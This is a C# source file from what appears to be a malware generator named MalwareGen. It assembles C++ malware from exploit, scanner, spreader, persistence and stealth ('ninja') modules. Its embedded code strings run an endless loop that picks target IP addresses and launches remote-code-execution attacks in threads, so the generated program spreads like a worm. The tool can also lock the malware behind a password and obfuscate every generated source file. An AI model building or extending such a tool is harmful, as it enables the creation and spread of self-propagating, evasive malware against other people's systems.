using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Forms;
using System.Xml;
using System.Text.RegularExpressions;

namespace MalwareGen
{
    class Controller
    {
        /*=======================================================================================*/
        /*======================================Static string====================================*/
        //Exploit code in main function
        private static String mainExploit =
            "	int  ipAddress[4];\r\n"
            + "[chooseIP](ipAddress);\r\n"
            + "	for (;;){\r\n"
            + "	initAttack(ipAddress);\r\n"
            + "    }\r\n"
            + "    WSACleanup();\r\n";
        //Define string for Exploit in header file
        private static String headExploit =
            "DWORD WINAPI exploit_[exploitName]( LPVOID lpParam );";
        //Start a thread with init data for thread
        private static String startThread = "\r\n"
            + "std::vector<DWORD> arr_dwThreadIdModule;\r\n"
            + "std::vector<HANDLE> arr_hThreadModule;\r\n"
            + "HANDLE hThread = NULL;\r\n"
            + "DWORD dwTID = 0;\r\n";
        //End a thread with wait for all thread in array
        private static String endThread = "\r\n"
            + "WaitForMultipleObjects(arr_hThreadModule.size(), &arr_hThreadModule[0], TRUE, INFINITE);\r\n"
            + "for (int i = 0; i < (int)arr_hThreadModule.size(); i++) {\r\n"
            + "if(arr_hThreadModule[i])\r\n"
            + "CloseHandle(arr_hThreadModule[i]);\r\n"
            + "}\r\n";
        private static String[] types = { "exploit", "control", "ninja", "postexploit", "persistence", "scanner", "spreader" };
        public static String moduleDir = @"Modules\";
        public static String commonDir = @"Modules\Common\";
        public static String outputDir = @"Output\";

        /*=======================================================================================*/
        /*==================================Global Variable======================================*/
        private static List<Modules> lsModules = new List<Modules>();
        public static String malPass = "";
        private static String targetDir = "";
        public static String templateDir = "";
        /*=======================================================================================*/
        /*======================================Functions========================================*/
        public static List<Modules> getlsModules()
        {
            return lsModules;
        }

        //Func: clearAllModules()
        //Free memory after generate
        public static void clearAllModules()
        {
            lsModules.Clear();
        }

        //Func: removeModulebyName()
        //Remove a moudle in lsModule by its name
        private static void removeModulebyName(String MName)
        {
            lsModules.Remove(lsModules.Find(p => p.MName == MName));
        }

        //Func: BuildTree()
        //List modules and show them on a Directory tree
        public static void BuildTree(DirectoryInfo directoryInfo, TreeNodeCollection addInMe)
        {
            TreeNode curNode = addInMe.Add(directoryInfo.Name);
            foreach (DirectoryInfo subdir in directoryInfo.GetDirectories())
            {
                //Except Common folder in Moudles
                if (!subdir.FullName.Contains("Common"))
                    BuildTree(subdir, curNode.Nodes);
            }
        }

        //Func: checkMType()
        //Check if module has MType, MType is a mandatory field.
        public static bool checkMType(Modules mod)
        {
            if (types.Contains(mod.Class.ToLower()))
                return true;
            return false;
        }

        public static void addModules(Modules mod)
        {
            //validate module
            if (mod.MName == "" || !checkMType(mod))
            {
                MessageBox.Show("Module " + mod.MName + " is invalid! Please check again");
                return;
            }
            //check RandomName Ninja module
            if (hasRandomName() > 1)
            {
                MessageBox.Show("Just one randomName Ninja module can be use!");
                return;
            }
            try
            {
                //Each module just add once
                bool check = true;
                foreach (Modules a in lsModules)
                {
                    if (mod.MName == a.MName)
                        check = false;
                }

                if (check)
                {
                    //if exploit, choose Spreader for it
                    if (mod.Class.ToLower() == "exploit")
                    {
                        Modules sp = new Modules();
                        //Spreader not null
                        do
                            sp = ChooseSpreader(mod.Type, "for Exploit " + mod.MName);
                        while (sp == null);
                        addModules(sp);
                        mod.Spreader = sp.MName;
                    }
                    lsModules.Add(mod);
                }
            }
            catch (Exception e)
            {
                MessageBox.Show(e.ToString());
            }

        }
        private static String getRandomNameNinja()
        {
            String ret = "";
            foreach (Modules mod in lsModules)
            {
                if (mod.Type == "randomName")
                    ret = mod.MName;
            }
            return ret;
        }
        private static bool validateInput(ref String ret)
        {
            if ((!Regex.IsMatch(ret, @"^[a-zA-Z0-9]|^[_-]*$")) || ret == "" || ret == null)
            {
                return false;
            }
            else
            {
                ret = ret.Trim();
                return true;
            }
        }
        private static void CopyDir(string sourceDir, string targetDir)
        {
            Directory.CreateDirectory(targetDir);

            foreach (var file in Directory.GetFiles(sourceDir))
                File.Copy(file, Path.Combine(targetDir, Path.GetFileName(file)), true);

            foreach (var directory in Directory.GetDirectories(sourceDir))
                CopyDir(directory, Path.Combine(targetDir, Path.GetFileName(directory)));
        }

        //Func: generate()
        //Main generate function to generate a malware source code.
        public static void generate(String malName, String template, bool isObfuscate)
        {
            string threads = "1";
            Template _template = new Template(template);
            templateDir = template + "\\";
            //copy template file to output folder
            targetDir = Path.Combine(outputDir, malName + "\\");
            if (!Directory.Exists(targetDir) && validateInput(ref targetDir))
            {
                Directory.CreateDirectory(targetDir);
            }
            else
            {
                MessageBox.Show("Malware's name has existed or invalid, please choose another name!");
                return;
            }
            String headerFile = targetDir + malName + ".h";
            String sourceFile = targetDir + malName + ".cpp";
            File.Copy(templateDir + "template.h", headerFile, true);
            File.Copy(templateDir + "template.cpp", sourceFile, true);
            String mainHeadStr = File.ReadAllText(headerFile);
            String mainSourStr = File.ReadAllText(sourceFile);
            //Specify for random name required module

            //Create exploit file
            if (hasRCE())
            {
                //Choose threads (targets/round)
                threads = ChooseThreads();
                //+choose main scanner
                Modules sc = ChooseScanner(false);
                addModules(sc);
                //+replace main exploit
                String text = mainExploit;
                text = text.Replace("[chooseIP]", sc.MName);
                generateExploit(ref mainSourStr, malName, sc.MName);
                mainSourStr = mainSourStr.Replace("[mainExploit]", Environment.NewLine + text);
                //+Add function name in header file
                String tmp = "";
                foreach (Modules mod in lsModules)
                {
                    if (mod.Class.ToLower() == "exploit")
                    {
                        tmp += Environment.NewLine + headExploit;
                        tmp = tmp.Replace("[exploitName]", mod.MName);
                    }
                }

                mainHeadStr = mainHeadStr.Replace("[headExploit]", Environment.NewLine + tmp);
            }
            //Confirm setting
            if (!confirmGenerate(malName, template))
            {
                //if press cancel, delete targetDir
                errorHandle();
                return;
            }

            //Copy Common lib of Template
            //Common files
            string tarCom = targetDir + commonDir.Replace(moduleDir, "");
            if (!Directory.Exists(tarCom))
            {
                try
                {
                    Directory.CreateDirectory(tarCom);
                }
                catch
                {
                    // handle error here
                }
            }
            foreach (String common in _template.Commons)
            {
                String indir = commonDir + common + "\\";
                String outdir = tarCom + common + "\\";
                CopyDir(indir, outdir);
            }
            //Copy Module files and its required common lib to output folder
            foreach (Modules mod in lsModules)
            {
                //Module files
                String tmp = targetDir + mod.Path.Replace("Modules", "");
                if (!Directory.Exists(tmp))
                {
                    try
                    {
                        Directory.CreateDirectory(tmp);
                    }
                    catch
                    {
                        // handle error here
                    }
                }

                foreach (String file in mod.Files)
                {
                    string tarFile = targetDir + file.Replace(moduleDir, "");
                    File.Copy(file, tarFile , true);
                }
                //Common files
                tmp = targetDir + commonDir.Replace(moduleDir, "");
                if (!Directory.Exists(tmp))
                {
                    try
                    {
                        Directory.CreateDirectory(tmp);
                    }
                    catch
                    {
                        // handle error here
                    }
                }
                foreach (String common in mod.Commons)
                {

                    String indir = commonDir + common + "\\";
                    String outdir = tmp + common + "\\";
                    CopyDir(indir, outdir);
                }
            }
            //include independent modules (require ="")
            String modStr = "";
            foreach (Modules mod in lsModules)
            {
                //generate modules code in source, header file

                //Add option (if exist)
                if (mod.hasArgv())
                {
                    String tmp = "\n\r"
                        + "else if(strcmp(argv[0],\"" + mod.Inputs["Argv"] + "\")==0[malPass])"
                        + "\n\r"
                        + "{\n\r"
                        + mod.MName + "();"
                        + "\n\r}//[optionElseIf]";
                    mainSourStr = mainSourStr.Replace("[optionElseIf]", tmp);
                    tmp = "";
                }
                else if (mod.isIndependentModule())
                {
                    //insert start thread code
                    if (modStr == "")
                    {
                        modStr += startThread;
                    }
                    modStr += generateModule(mod.MName);
                }
                //Insert ninja modules
                else if (mod.Class.ToLower() == "ninja" && (mod.Type == null||mod.Type==""))
                {
                    generateNinja(ref mainSourStr, mod.MName);
                }
                // Handle randomName type of Ninja module

                //[todo]
                if (hasRandomName() > 0)
                {
                    mainSourStr = mainSourStr.Replace("[isRandomName]", "true");
                    mainSourStr = mainSourStr.Replace("[randomeNameModule]", Environment.NewLine + getRandomNameNinja());
                }
                else
                {
                    mainSourStr = mainSourStr.Replace("[isRandomName]", "false");
                }
                //Add inputs,malName from user to module source, header file
                try
                {

                    string headfile = targetDir + mod.Path.Replace(moduleDir, "") + mod.MName + ".h";
                    string sourfile = targetDir + mod.Path.Replace(moduleDir, "") + mod.MName + ".cpp";
                    string headStr = File.ReadAllText(headfile);
                    string sourStr = File.ReadAllText(sourfile);
                    //add inputs
                    if (mod.Inputs.Count != 0)
                        foreach (KeyValuePair<String, String> item in mod.Inputs)
                        {
                            headStr = headStr.Replace("[" + item.Key + "]", item.Value);
                            sourStr = sourStr.Replace("[" + item.Key + "]", item.Value);
                        }
                    //setup malware's password for each module (if call create new process ...)
                    if (malPass != "")
                    {
                        sourStr = sourStr.Replace("[malPass]", " " + malPass);
                    }
                    else
                    {
                        sourStr = sourStr.Replace("[malPass]", "");
                    }
                    //add malName
                    headStr = headStr.Replace("[malName]", malName);
                    sourStr = sourStr.Replace("[malName]", malName);
                    //Write module file
                    File.WriteAllText(headfile, headStr);
                    File.WriteAllText(sourfile, sourStr);
                }
                catch (Exception e)
                {
                    errorHandle();
                    MessageBox.Show(e.ToString());
                }
            }
            if (modStr != "")
            {
                //insert end thread code
                //modStr += endThread;
                //replace
                mainSourStr = mainSourStr.Replace("[endThread]", Environment.NewLine + endThread);
                mainSourStr = mainSourStr.Replace("[moduleThreads]", modStr);
            }
            //Create header file
            generateHeader(ref mainHeadStr, malName, threads);
            //add malName in Main source and header file:
            mainHeadStr = mainHeadStr.Replace("[malName]", malName);
            mainSourStr = mainSourStr.Replace("[malName]", malName);
            //Setup malware's password for main file
            if (malPass != "")
            {
                mainSourStr = mainSourStr.Replace("[nArgc]", "1");
                mainSourStr = mainSourStr.Replace("[malPass]", "&&strcmp(argv[argc-1],\"" + malPass + "\")==0");
            }
            else
            {
                mainSourStr = mainSourStr.Replace("[nArgc]", "0");
                mainSourStr = mainSourStr.Replace("[malPass]", "");
            }
            //Write to file
            try
            {
                //header
                File.WriteAllText(headerFile, mainHeadStr);
                //source
                File.WriteAllText(sourceFile, mainSourStr);
                //Handler for obfuscate code feature
                if (isObfuscate)
                {
                    UInt16 level=0;
                    do
                    {
                        string tmp = ChooseInput("Obfuscation level", "10", "Obfuscate code");
                        bool check = UInt16.TryParse(tmp, out level);
                        if (!check||level==0)
                        {
                            MessageBox.Show("Wrong level! Try again");
                        }
                    } while (level == 0);
                    ObfuscateAll(targetDir, level);
                    //Obfuscate main file for debug
                    //ObfuscateCode.Obfuscate(targetDir + malName + ".cpp", targetDir + malName + ".cpp", level);
                    
                }
                    

                String compileStr = generateCompileStr(malName);
                frmResult frs = new frmResult(targetDir, compileStr);
                frs.Show();
            }
            catch (Exception e)
            {
                errorHandle();
                MessageBox.Show("An error has occured while writting file!" + Environment.NewLine + e.ToString());
            }
        }

        //Func: generateCompileStr()
        //For future compile malware in terminal. In this time, we just
        //compile malware by using Microsoft Visual Studio 2015+
        private static String generateCompileStr(String malName)
        {
            String ret = "Using Visual studio >=15 to compile " + malName;

            return ret;
        }

        //Func: hasRCE()
        //Check if lsModule has Exploit Module and can make the "Remote code excution"
        private static bool hasRCE()
        {
            bool check = false;
            foreach (Modules a in lsModules)
            {
                if (a.Class.ToLower() == "exploit")
                    if (a.Type.ToLower() == "rce")
                        check = true;
            }
            return check;
        }

        private static int hasRandomName()
        {
            int check = 0;
            foreach (Modules a in lsModules)
            {
                if (a.Class.ToLower() == "ninja")
                    if (a.Type == "randomName")
                        check++;
            }
            return check;
        }

        //Func: generateHeader()
        //A plugin of generate(), generate header file
        private static void generateHeader(ref String _headStr, String malName, String threads)
        {
            String tmp = "";
            //include header String
            foreach (Modules test in lsModules)
            {
                //include header file
                foreach (String file in test.Files)
                {
                    String a = file.Replace(moduleDir, "");
                    tmp += (a.Substring(a.Length - 2, 2) == ".h") ? "#include \"" + a + "\"" + Environment.NewLine : "";
                }
                    
            }
            _headStr = _headStr.Replace("[headerfile]", Environment.NewLine + tmp);
            tmp = "";
            //include header String
            foreach (Modules test in lsModules)
            {
                if (test.Header != null)
                    tmp += "//" + test.MName + Environment.NewLine + test.Header.Trim() + Environment.NewLine;
            }
            _headStr = _headStr.Replace("[headerString]", Environment.NewLine + tmp);
            tmp = "";
            //include threads
            _headStr = _headStr.Replace("[threads]", threads);

        }

        //Func: generateExploit()
        //A plugin of generate(), generate Exploit code if an Exploit module has been chosen
        private static void generateExploit(ref String _sourStr, String malName, String scanner)
        {

            String mainFile = targetDir + "\\" + malName + ".cpp";
            //exFunc store exploit function for each exploit Module.
            //exThre store the code that run the exploit Module in mutithreads mode.
            String exFunc = "";
            String exThre = "";
            //String ret = "";
            //ret = File.ReadAllText(templateDir + "\\" + "template.cpp");
            bool check = false;
            foreach (Modules test in lsModules)
            {
                if (test.Class.ToLower() == "exploit")
                {
                    check = true;

                    //generate exploit function
                    try
                    {
                        exFunc += File.ReadAllText(templateDir + "\\" + "exploitFunction.cpp");
                        exThre += File.ReadAllText(templateDir + "\\" + "exploitThreads.cpp");
                    }
                    catch
                    {
                        MessageBox.Show("Can't find exploitFunction.cpp and exploitThreads.cpp in " + templateDir);
                    }
                    //generate exploit Function

                    exFunc = exFunc.Replace("[exploitName]", test.MName);
                    exFunc = exFunc.Replace("[Spreader]", test.Spreader);
                    exFunc += Environment.NewLine;
                    //generate exploit threads
                    exThre = exThre.Replace("[exploitName]", test.MName);
                    exThre = exThre.Replace("[Scanner]", scanner);
                    exThre += Environment.NewLine;
                }
            }
            if (check)
            {
                _sourStr = _sourStr.Replace("[exploitThreads]", Environment.NewLine + exThre + Environment.NewLine + "//[exploitThreads]");
                _sourStr = _sourStr.Replace("[exploit_function]", Environment.NewLine + exFunc + Environment.NewLine + "//[exploit_function]");
            }
        }

        //Func: generateNinja()
        //A plugin of generate(), generate Ninja code if a Ninja module has been chosen
        private static void generateNinja(ref String _sourStr, String MName)
        {
            _sourStr = _sourStr.Replace("[ninjaModule]", Environment.NewLine + MName + "();\r\n" + "//[ninjaModule]");
        }

        //Func: generateModule()
        //A plugin of generate(), generate normal Module code.
        private static String generateModule(String MName)
        {
            String ret = Environment.NewLine;
            String tmp = File.ReadAllText(templateDir + "\\" + "moduleThreads.cpp");
            ret = tmp.Replace("[MName]", MName);
            return ret;
        }

        //Func: ObfuscateAll()
        //A plugin of generate(), Obfuscate all source code in targetDir except for Common
        private static void ObfuscateAll(string sDir, int level)
        {
            try
            {
                String[] fileArray = Directory.GetFiles(sDir,"*.cpp", SearchOption.AllDirectories);
                foreach(string file in fileArray)
                {

                    ObfuscateCode.Obfuscate(file, file, level);
                }
            }
            catch (System.Exception excpt)
            {
                MessageBox.Show(excpt.ToString());
            }
        }

        //Func: ChooseSpreader(), ChooseScanner()
        //Choose Spreader, Scanner when an Exploit module has been chosen
        private static Modules ChooseSpreader(String exploitType, string info)
        {
            frmChooseSpreader testDialog = new frmChooseSpreader(exploitType, info);
            Modules ret = new Modules();

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }

        private static Modules ChooseScanner(bool depen)
        {
            frmChooseScanner testDialog = new frmChooseScanner(depen);
            Modules ret = new Modules();

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }

        //Func: ChooseInput()
        //Choose inputs if a module requied input from generator
        private static String ChooseInput(String inputName, String value, String modName)
        {
            frmInput testDialog = new frmInput(inputName, value, modName);
            String ret = "";

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }

        //Func: confirmGenerate()
        //Confirm all module after choosing them
        private static bool confirmGenerate(String malName, String template)
        {
            frmConfirm testDialog = new frmConfirm(malName, template);
            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                testDialog.Dispose();
                return true;
            }
            testDialog.Dispose();
            return false;
        }

        //Func: addInputValue()
        //Get input from user in win form
        public static void addInputValue(ref Modules mod, String key, String value)
        {
            String val = ChooseInput(key, value, mod.MName);
            mod.Inputs[key] = val;
        }

        //Func: ChooseThreads()
        //Get threads of Exploit module 
        private static String ChooseThreads()
        {
            frmThreads testDialog = new frmThreads();
            String ret = "";

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }

        //Func: errorHandle()
        //If an error occur after confirm modules, Delete target folder.
        public static void errorHandle()
        {
            if (Directory.Exists(targetDir))
                try
                {
                    Directory.Delete(targetDir, true);
                }
                catch { }
        }
    }



}
